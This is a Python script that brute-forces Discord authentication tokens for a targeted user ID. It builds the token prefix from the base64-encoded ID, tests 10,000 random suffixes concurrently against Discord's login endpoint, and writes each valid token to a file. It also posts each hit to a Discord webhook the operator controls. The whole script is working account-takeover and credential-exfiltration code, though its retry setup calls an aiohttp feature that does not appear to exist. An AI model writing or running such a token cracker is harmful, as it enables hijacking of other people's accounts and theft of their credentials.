import base64
import random
import string
import asyncio
import aiohttp
from aiohttp import ClientSession
from discord_webhook import DiscordWebhook

# Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"

# Set up the HTTP session with retries and backoff
retry_options = aiohttp.Retry(
    total=3,
    status=[429, 500, 502, 503, 504],
    backoff_factor=1
)
session = None

# Encode the user ID to create the initial token
id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii")).decode("ascii")

# Send a "running" message to the webhook to indicate that the code has started
webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is running")
webhook.execute()

async def generate_and_test_tokens(token_suffixes):
    valid_tokens = []
    invalid_count = 0
    async with ClientSession() as session:
        for suffix in token_suffixes:
            token = f"{id_to_token}.{suffix}"
            headers = {'Authorization': token}
            async with session.get('https://discordapp.com/api/v9/auth/login', headers=headers) as response:
                if response.status == 200:
                    print('[+] VALID' + ' ' + token)
                    valid_tokens.append(token)
                    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"@everyone Valid token found: {token}")
                    webhook.execute()
                    with open('hit.txt', 'a+') as f:
                        f.write(f'{token}\n')
                else:
                    invalid_count += 1
    return valid_tokens, invalid_count

# Number of tokens to generate and test
num_tokens = 10000

# Generate token suffixes
token_suffixes = [''.join(random.choices(string.ascii_letters + string.digits, k=29)) for _ in range(num_tokens)]

# Number of concurrent requests
concurrent_requests = 100

# Split token suffixes into chunks for concurrent processing
token_chunks = [token_suffixes[i:i+concurrent_requests] for i in range(0, num_tokens, concurrent_requests)]

# Run concurrent requests using asyncio
loop = asyncio.get_event_loop()
tasks = [generate_and_test_tokens(chunk) for chunk in token_chunks]
results = loop.run_until_complete(asyncio.gather(*tasks))
loop.close()

# Flatten the valid tokens list and calculate the total number of invalid tokens
valid_tokens = [token for sublist, _ in results for token in sublist]
total_invalid = sum(invalid_count for _, invalid_count in results)

print(f"Total Invalid Tokens: {total_invalid}")
